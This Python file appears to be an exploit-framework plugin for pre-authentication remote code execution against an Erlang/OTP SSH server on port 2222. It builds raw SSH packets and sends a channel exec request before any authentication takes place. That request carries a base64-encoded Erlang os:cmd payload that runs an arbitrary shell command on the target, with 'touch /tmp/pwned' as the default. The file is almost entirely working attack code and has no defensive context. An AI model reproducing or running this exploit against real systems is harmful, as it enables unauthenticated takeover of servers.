import socket
import struct
import time
import base64
from pathlib import Path

from Metode import *
from utils import Logger

log = Logger()


class CExploit(Exploit):

    def __init__(self):
        super().__init__()
        self._ipAddr = ""
        self._target_port = 2222
        self._command = "touch /tmp/pwned"
        self._channel_id = 0

    # =========================
    # Payload preparation
    # =========================
    def makePayload(self, params=list):
        """
        params format:
        [
            (ip, port, command)
        ]
        """
        log.debugger(params)

        self._target_ip = params[0][0]
        if len(params[0]) > 1 and params[0][1]:
            self._command = params[0][1]

    # =========================
    # SSH helper functions
    # =========================
    def _string_payload(self, s: str) -> bytes:
        s_bytes = s.encode()
        return struct.pack(">I", len(s_bytes)) + s_bytes

    def _pad_packet(self, payload: bytes, block_size=8) -> bytes:
        min_padding = 4
        padding_len = block_size - ((len(payload) + 5) % block_size)
        if padding_len < min_padding:
            padding_len += block_size

        return (
            struct.pack(">I", len(payload) + 1 + padding_len)
            + bytes([padding_len])
            + payload
            + bytes(padding_len)
        )

    def _build_kexinit(self) -> bytes:
        cookie = b"\x00" * 16

        def name_list(l):
            return self._string_payload(",".join(l))

        return (
            b"\x14"
            + cookie
            + name_list([
                "curve25519-sha256",
                "ecdh-sha2-nistp256",
                "diffie-hellman-group14-sha256"
            ])
            + name_list(["rsa-sha2-256", "rsa-sha2-512"])
            + name_list(["aes128-ctr"]) * 2
            + name_list(["hmac-sha1"]) * 2
            + name_list(["none"]) * 2
            + name_list([]) * 2
            + b"\x00"
            + struct.pack(">I", 0)
        )

    def _build_channel_open(self) -> bytes:
        return (
            b"\x5a"
            + self._string_payload("session")
            + struct.pack(">I", self._channel_id)
            + struct.pack(">I", 0x68000)
            + struct.pack(">I", 0x10000)
        )

    def _build_channel_request(self, erlang_cmd: str) -> bytes:
        return (
            b"\x62"
            + struct.pack(">I", self._channel_id)
            + self._string_payload("exec")
            + b"\x01"
            + self._string_payload(erlang_cmd)
        )

    def _format_erlang_command(self, cmd: str) -> str:
        encoded = base64.b64encode(cmd.encode()).decode()
        return f'os:cmd(binary_to_list(base64:decode("{encoded}"))).'

    # =========================
    # Exploit execution
    # =========================
    def startExploit(self):
        out_dir = Path(self.outExpFile)
        out_dir.mkdir(parents=True, exist_ok=True)

        out_file = out_dir / f"{self._target_ip}_erlang_rce.txt"

        erlang_payload = self._format_erlang_command(self._command)
        log.debugger(f"Erlang payload: {erlang_payload}")

        try:
            with socket.create_connection(
                (self._target_ip, self._target_port),
                timeout=5
            ) as sock:

                #log.info(f"Connecting to {self._target_ip}:{self._target_port}")

                # Banner
                sock.sendall(b"SSH-2.0-OpenSSH_8.9\r\n")
                banner = sock.recv(1024).decode(errors="ignore")
                #log.info(f"Banner: {banner.strip()}")

                time.sleep(0.3)

                # KEXINIT
                sock.sendall(self._pad_packet(self._build_kexinit()))
                time.sleep(0.3)

                # CHANNEL_OPEN (pre-auth)
                sock.sendall(self._pad_packet(self._build_channel_open()))
                time.sleep(0.3)

                # CHANNEL_REQUEST exec
                sock.sendall(
                   self._pad_packet(
                        self._build_channel_request(erlang_payload)
                    )
                )

                with open(out_file, "w") as f:
                    f.write("[âœ“] Erlang SSH Pre-Auth RCE Triggered\n")
                    f.write(f"Target : {self._target_ip}:{self._target_port}\n")
                    f.write(f"Command: {self._command}\n")

                #log.success("Exploit sent successfully (blind RCE)")

        except Exception as e:
            log.error(str(e))
 
